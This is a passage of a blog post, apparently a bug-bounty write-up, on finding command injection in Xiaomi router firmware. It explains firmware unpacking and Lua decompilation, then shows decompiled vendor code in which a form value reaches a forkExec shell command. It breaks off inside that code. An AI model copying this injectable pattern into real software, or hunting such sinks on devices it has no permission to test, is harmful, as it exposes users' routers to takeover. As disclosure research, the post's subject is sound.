@@ -1,0 +1,425 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="miwifi..">
+<meta property="og:type" content="article">
+<meta property="og:title" content="某米路由器漏洞挖掘分享">
+<meta property="og:url" content="https://ixout.github.io/posts/14352/index.html">
+<meta property="og:site_name" content="ixout&#39;s blog">
+<meta property="og:description" content="miwifi..">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2024-10-10_191325.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2024-10-10_191711.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2024-10-10_191825.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-06-19_143422.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2024-10-13_180736.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2024-10-13_181106.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2024-10-13_181533.png">
+<meta property="article:published_time" content="2025-06-17T12:16:11.000Z">
+<meta property="article:modified_time" content="2025-06-19T07:26:31.481Z">
+<meta property="article:author" content="ixout">
+<meta property="article:tag" content="iot">
+<meta property="article:tag" content="xiaomi">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2024-10-10_191325.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.png">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.png">
+        
+      
+    
+    <!-- title -->
+    <title>某米路由器漏洞挖掘分享</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="ixout's blog" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/posts/36975/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ixout.github.io/posts/14352/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ixout.github.io/posts/14352/&text=某米路由器漏洞挖掘分享"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ixout.github.io/posts/14352/&title=某米路由器漏洞挖掘分享"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ixout.github.io/posts/14352/&is_video=false&description=某米路由器漏洞挖掘分享"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=某米路由器漏洞挖掘分享&body=Check out this article: https://ixout.github.io/posts/14352/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ixout.github.io/posts/14352/&title=某米路由器漏洞挖掘分享"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ixout.github.io/posts/14352/&title=某米路由器漏洞挖掘分享"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ixout.github.io/posts/14352/&title=某米路由器漏洞挖掘分享"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ixout.github.io/posts/14352/&title=某米路由器漏洞挖掘分享"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ixout.github.io/posts/14352/&name=某米路由器漏洞挖掘分享&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ixout.github.io/posts/14352/&t=某米路由器漏洞挖掘分享"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E5%9B%BA%E4%BB%B6"><span class="toc-number">2.</span> <span class="toc-text">关于固件</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><span class="toc-number">3.</span> <span class="toc-text">漏洞挖掘</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E4%B8%80"><span class="toc-number">3.1.</span> <span class="toc-text">尝试一</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E4%BA%8C"><span class="toc-number">3.2.</span> <span class="toc-text">尝试二</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E4%B8%89"><span class="toc-number">3.3.</span> <span class="toc-text">尝试三</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#End"><span class="toc-number">4.</span> <span class="toc-text">End</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        某米路由器漏洞挖掘分享
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">ixout</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-06-17T12:16:11.000Z" class="dt-published" itemprop="datePublished">2025-06-17</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/iot/">iot</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/iot/" rel="tag">iot</a>, <a class="p-category" href="/tags/xiaomi/" rel="tag">xiaomi</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>去年年中开始接触IOT设备的漏洞挖掘, 之后有几个聊胜于无的产出, 但没啥变现机会, 大概是去年的国庆前后, 一位学长告诉我某米SRC最近有活动, 可以多看看这家路由器</p>
+<p>某米大概是国内少有的愿意给该类漏洞支付赏金并且<strong>出手大方</strong>的厂商了, 早在之前其实就有看过他家的设备, 不过当时只是为了复现漏洞, 没啥能力也没有想法深入挖挖</p>
+<p>在学长提醒之后, 就开始了这次的漏洞挖掘, 某米的设备采用的是魔改的openwrt框架, 仅开放了少数几个未授权接口, 这几个接口在前些年爆出过危害性高的漏洞, 一波修复之后, 看不出来有什么问题, 再加上菜菜, 主要挖掘的方向还是挖掘难度耕地而且危害也不那么高的授权接口</p>
+<p>好在运气还行, 找到了几个危害不大的水洞, 某米给钱大方加之活动加成(投递漏洞忘记参加活动了, 感谢开恩的技术小哥orz), 也算是小挣一笔, 距离漏洞提交已经过了大半年, 看了一下最新版本漏洞已经修复了, 跟大家分享一下漏洞挖掘的经验</p>
+<h1 id="关于固件"><a href="#关于固件" class="headerlink" title="关于固件"></a>关于固件</h1><p>某米路由器的固件大多可以在<a target="_blank" rel="noopener" href="https://www1.miwifi.com/miwifi_download.html">MiWiFi – 下载</a>找到, 不过不一定是最新版本</p>
+<p>固件采用的是ubifs, 没有加密, 直接用<code>ubireader + unsquashfs</code>就能解开</p>
+<p>openwrt框架下cgi的主要逻辑在<code>usr/lib/lua/luci/controller/</code>目录下, 此外还有一个某米自己常用的库在路径<code>usr/lib/lua/xiaoqiang/</code>, 我们关注的主要也就是这两部分</p>
+<p>直接打开其中的.lua文件发现是编译后luac文件, 且是魔改后的luac, 那么还需要对其进行反编译, 好在github上已经有许多工具了, <a target="_blank" rel="noopener" href="https://github.com/NyaMisty/unluac_miwifi">NyaMisty/unluac_miwifi</a>是其中很不错的一个</p>
+<p>反编译的结果其实已经能够大致阅读了, 不过现在ai这么普遍, 可以再借助ai进一步还原反编译结果的可读性</p>
+<p>直接结果</p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">L4</span><span class="params">()</span></span></span><br><span class="line">  <span class="keyword">local</span> L0, L1, L2, L3, L4, L5, L6, L7, L8, L9, L10, L11, L12, L13, L14, L15</span><br><span class="line">  L0 = <span class="built_in">require</span></span><br><span class="line">  L1 = <span class="string">&quot;xiaoqiang.common.XQFunction&quot;</span></span><br><span class="line">  L0 = L0(L1)</span><br><span class="line">  L1 = <span class="built_in">require</span></span><br><span class="line">  L2 = <span class="string">&quot;luci.cbi.datatypes&quot;</span></span><br><span class="line">  L1 = L1(L2)</span><br><span class="line">  L2 = &#123;&#125;</span><br><span class="line">  L3 = <span class="number">0</span></span><br><span class="line">  L4 = _UPVALUE0_</span><br><span class="line">  L4 = L4.formvalue</span><br><span class="line">  L5 = <span class="string">&quot;mac&quot;</span></span><br><span class="line">  L4 = L4(L5)</span><br><span class="line">  L5 = _UPVALUE0_</span><br><span class="line">  L5 = L5.formvalue</span><br><span class="line">  L6 = <span class="string">&quot;wan&quot;</span></span><br><span class="line">  L5 = L5(L6)</span><br><span class="line">  L5 = L5 <span class="keyword">or</span> L5</span><br><span class="line">  L6 = _UPVALUE0_</span><br><span class="line">  L6 = L6.formvalue</span><br><span class="line">  L7 = <span class="string">&quot;lan&quot;</span></span><br><span class="line">  L6 = L6(L7)</span><br><span class="line">  L6 = L6 <span class="keyword">or</span> L6</span><br><span class="line">  L7 = _UPVALUE0_</span><br><span class="line">  L7 = L7.formvalue</span><br><span class="line">  L8 = <span class="string">&quot;admin&quot;</span></span><br><span class="line">  L7 = L7(L8)</span><br><span class="line">  L7 = L7 <span class="keyword">or</span> L7</span><br><span class="line">  L8 = _UPVALUE0_</span><br><span class="line">  L8 = L8.formvalue</span><br><span class="line">  L9 = <span class="string">&quot;pridisk&quot;</span></span><br><span class="line">  L8 = L8(L9)</span><br><span class="line">  L8 = L8 <span class="keyword">or</span> L8</span><br><span class="line">  L9 = _UPVALUE0_</span><br><span class="line">  L9 = L9.formvalue</span><br><span class="line">  L10 = <span class="string">&quot;name&quot;</span></span><br><span class="line">  L11 = <span class="literal">nil</span></span><br><span class="line">  L12 = <span class="string">&quot;?commonstr&quot;</span></span><br><span class="line">  L9 = L9(L10, L11, L12)</span><br><span class="line">  L9 = L9 <span class="keyword">or</span> L9</span><br><span class="line">  L10 = _UPVALUE0_</span><br><span class="line">  L10 = L10.formvalue</span><br><span class="line">  L11 = <span class="string">&quot;option&quot;</span></span><br><span class="line">  L10 = L10(L11)</span><br><span class="line">  L10 = L10 <span class="keyword">or</span> L10</span><br><span class="line">  L11 = L0.isStrNil</span><br><span class="line">  L12 = L4</span><br><span class="line">  L11 = L11(L12)</span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> L11 <span class="keyword">then</span></span><br><span class="line">    L11 = L1.macaddr</span><br><span class="line">    L12 = L4</span><br><span class="line">    L11 = L11(L12)</span><br><span class="line">    <span class="keyword">if</span> L11 <span class="keyword">then</span></span><br><span class="line">      L11 = _setMacFilter</span><br><span class="line">      L12 = L4</span><br><span class="line">      L13 = L9</span><br><span class="line">      L14 = L10</span><br><span class="line">      L15 = L5</span><br><span class="line">      L11 = L11(L12, L13, L14, L15)</span><br><span class="line">      L3 = L11</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    L3 = <span class="number">1508</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  L2.code = L3</span><br><span class="line">  <span class="keyword">if</span> L3 ~= <span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">    L11 = _UPVALUE1_</span><br><span class="line">    L11 = L11.getErrorMessage</span><br><span class="line">    L12 = L3</span><br><span class="line">    L11 = L11(L12)</span><br><span class="line">    L2.msg = L11</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  L11 = _UPVALUE0_</span><br><span class="line">  L11 = L11.write_json</span><br><span class="line">  L12 = L2</span><br><span class="line">  L11(L12)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">setMacFilter = L4</span><br></pre></td></tr></table></figure>
+<p>ai恢复可读性</p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 设置MAC过滤的函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setMacFilter</span><span class="params">()</span></span></span><br><span class="line">    <span class="comment">-- 导入模块</span></span><br><span class="line">    <span class="keyword">local</span> XQFunction = <span class="built_in">require</span>(<span class="string">&quot;xiaoqiang.common.XQFunction&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> datatypes = <span class="built_in">require</span>(<span class="string">&quot;luci.cbi.datatypes&quot;</span>)    </span><br><span class="line">    <span class="comment">-- 用于存储返回结果</span></span><br><span class="line">    <span class="keyword">local</span> result = &#123;&#125;    </span><br><span class="line">    <span class="comment">-- 获取表单数据</span></span><br><span class="line">    <span class="keyword">local</span> mac = _UPVALUE0_.formvalue(<span class="string">&quot;mac&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> wan = _UPVALUE0_.formvalue(<span class="string">&quot;wan&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">local</span> lan = _UPVALUE0_.formvalue(<span class="string">&quot;lan&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">local</span> admin = _UPVALUE0_.formvalue(<span class="string">&quot;admin&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">local</span> pridisk = _UPVALUE0_.formvalue(<span class="string">&quot;pridisk&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">local</span> name = _UPVALUE0_.formvalue(<span class="string">&quot;name&quot;</span>, <span class="literal">nil</span>, <span class="string">&quot;?commonstr&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">local</span> option = _UPVALUE0_.formvalue(<span class="string">&quot;option&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span>    </span><br><span class="line">    <span class="comment">-- 初始化返回码</span></span><br><span class="line">    <span class="keyword">local</span> code = <span class="number">0</span>    </span><br><span class="line">    <span class="comment">-- 检查MAC地址是否有效</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> XQFunction.isStrNil(mac) <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">if</span> datatypes.macaddr(mac) <span class="keyword">then</span></span><br><span class="line">            <span class="comment">-- 设置MAC过滤并获取返回码</span></span><br><span class="line">            code = _setMacFilter(mac, name, option, wan)</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            code = <span class="number">1508</span>  <span class="comment">-- 无效MAC地址错误码</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        code = <span class="number">1508</span>  <span class="comment">-- MAC地址为空错误码</span></span><br><span class="line">    <span class="keyword">end</span>   </span><br><span class="line">    <span class="comment">-- 设置返回结果</span></span><br><span class="line">    result.code = code   </span><br><span class="line">    <span class="comment">-- 如果有错误，获取错误信息</span></span><br><span class="line">    <span class="keyword">if</span> code ~= <span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">        result.msg = _UPVALUE1_.getErrorMessage(code)</span><br><span class="line">    <span class="keyword">end</span>    </span><br><span class="line">    <span class="comment">-- 输出JSON结果</span></span><br><span class="line">    _UPVALUE0_.write_json(result)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+<p>效果外瑞古德</p>
+<h1 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h1><p>对目标进行挖掘时, 有两篇文章给予了我莫大帮助</p>
+<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/3000">奇安信攻防社区-小米AX9000路由器CVE-2023-26315漏洞挖掘</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.thalium.re/posts/rooting-xiaomi-wifi-routers/">Rooting Xiaomi WiFi Routers</a></p>
+<p>winmt神的文章介绍的挖掘方向主要是通过lua层面的接口进入二进制层面进行漏洞挖掘</p>
+<p>第二篇文章介绍了数个漏洞, 但主要参考其中针对早期miwifi设备并没有对<code>\n</code>过滤, 进行命令注入的部分</p>
+<p>作为没啥经验的菜鸡, 不妨先顺着前辈的思路走, 看有无漏网之鱼</p>
+<h2 id="尝试一"><a href="#尝试一" class="headerlink" title="尝试一"></a>尝试一</h2><p>winmt神的文章已经将分析过程写得非常详细</p>
+<p>针对该类漏洞直接在获得的各个固件文件系统去找<code>/sbin</code>目录下的<code>plugincenter</code>, <code>smartcontroller</code>, <code>indexservice</code>等文件, 拖入到ida中交叉引用命令执行函数即可</p>
+<p>一番搜索还真在<code>Redmi_AC2100</code>中找到一个</p>
+<p>在<code>***2100</code>中当访问<code>/api/xqdatacenter/request</code>且用户传入的<code>api</code>数值为<code>605</code>时</p>
+<p>经由<code>thrifttunnel</code>与<code>datacener</code>处理后</p>
+<p>最终请求会被交付给程序<code>/usr/sbin/plugincenter</code>中的接口<code>parseUninstallPluginApi</code>进行处理,其目的是进行插件卸载工作</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2024-10-10_191325.png" alt=""></p>
+<p>进入<code>datacenter::PluginApiBasic::uninstallPlugin</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2024-10-10_191711.png" alt=""></p>
+<p>核心是<code>PluginManager::uninstallPlugin</code>函数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2024-10-10_191825.png" alt=""></p>
+<p>在该流程中并没有用户输入进行足够的合法性验证,导致用户输入被直接拼接入命令中执行,从而导致命令注入</p>
+<p>满心欢喜提交, 可惜内部已知</p>
+<h2 id="尝试二"><a href="#尝试二" class="headerlink" title="尝试二"></a>尝试二</h2><p>经过第一次尝试, 发现rpc调用模式下漏洞存量并不多, 且偶有产出也大概率重复(挖的人着实不少)</p>
+<p>那么不妨将目光转向lua层, lua层接口成百上千, 且调用了大量库内容, 可挖掘内容是二进制层面的好几倍</p>
+<p>针对iot设备常见的漏洞挖掘方式, 主要有两种</p>
+<ol>
+<li>从用户可控数据流出发, 追踪数据流流经的相关处理, 判断其中是否存在危险点</li>
+<li>批量寻找危险点, 反向分析是否能够受用户控制</li>
+</ol>
+<p>在如此多接口的情况下, 显然第二种方法会更优</p>
+<p>观察一下, 发现cgi中用于执行系统命令的方法主要有三个</p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xiaoqiang.common.XQFunction.forkExec</span><br><span class="line"><span class="built_in">os</span>.<span class="built_in">execute</span></span><br><span class="line">luci.util.exec</span><br></pre></td></tr></table></figure>
+<p>不知道大佬有没有更好的办法, 反正我们菜鸡就是直接用文档编辑器逐个打开反编译出来的lua文件, 批量搜索这些方法的调用, 观察参数是否能够受用户控制, 也就是来自<code>formvalue</code></p>
+<p>就是这么简单粗暴, 没有一丝套路</p>
+<p>这么在<code>/usr/lib/lua/luci/controller/api</code>一通乱搜, 还真有所收获</p>
+<p>在设备<code>be*</code>中<code>/usr/lib/lua/luci/controller/api/xqnetwork.lua</code>中有一个函数<code>setNfcStatus</code></p>
+<p>反编译后结果大致如下</p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setNfcStatus</span><span class="params">()</span></span></span><br><span class="line">    <span class="keyword">local</span> xqLog = <span class="built_in">require</span>(<span class="string">&quot;xiaoqiang.XQLog&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> uci = <span class="built_in">require</span>(<span class="string">&quot;luci.model.uci&quot;</span>).cursor()</span><br><span class="line">    <span class="keyword">local</span> nfcUtil = <span class="built_in">require</span>(<span class="string">&quot;xiaoqiang.util.XQNfcUtil&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> xqFunction = <span class="built_in">require</span>(<span class="string">&quot;xiaoqiang.common.XQFunction&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">local</span> nfc_enable = LuciHttp.formvalue(<span class="string">&quot;nfc_enable&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> response = &#123;&#125;</span><br><span class="line">    response.code = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    uci:set(<span class="string">&quot;nfc&quot;</span>, <span class="string">&quot;nfc&quot;</span>, <span class="string">&quot;nfc_enable&quot;</span>, nfc_enable)</span><br><span class="line">    uci:commit(<span class="string">&quot;nfc&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> nfc_enable == <span class="string">&quot;0&quot;</span> <span class="keyword">then</span></span><br><span class="line">        nfcUtil.nfc_disable()</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        nfcUtil.nfc_update()</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">local</span> isMeshRe = xqFunction.isMeshRe()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> isMeshRe <span class="keyword">then</span></span><br><span class="line">        nfcUtil.nfc_mesh_sync_disable()</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">local</span> isMeshCap = xqFunction.isMeshCap()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> isMeshCap <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">local</span> randomID = xqFunction.GenRandID(<span class="number">8</span>)</span><br><span class="line">            uci:set(<span class="string">&quot;nfc&quot;</span>, <span class="string">&quot;nfc&quot;</span>, <span class="string">&quot;config_id&quot;</span>, randomID)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">local</span> syncData = &#123;&#125;</span><br><span class="line">            syncData.cmd = <span class="string">&quot;sync_nfc&quot;</span></span><br><span class="line">            syncData.nfc_enable = <span class="built_in">tostring</span>(nfc_enable)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">local</span> json = <span class="built_in">require</span>(<span class="string">&quot;luci.json&quot;</span>).encode(syncData)</span><br><span class="line">            xqLog.<span class="built_in">log</span>(<span class="number">6</span>, <span class="string">&quot;CAP call RE do action msg: &quot;</span> .. json)</span><br><span class="line"></span><br><span class="line">            xqFunction.forkExec(<span class="string">&quot;/sbin/whc_to_re_common_api.sh action &#x27;&quot;</span> .. json .. <span class="string">&quot;&#x27;&quot;</span>)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    uci:commit(<span class="string">&quot;nfc&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    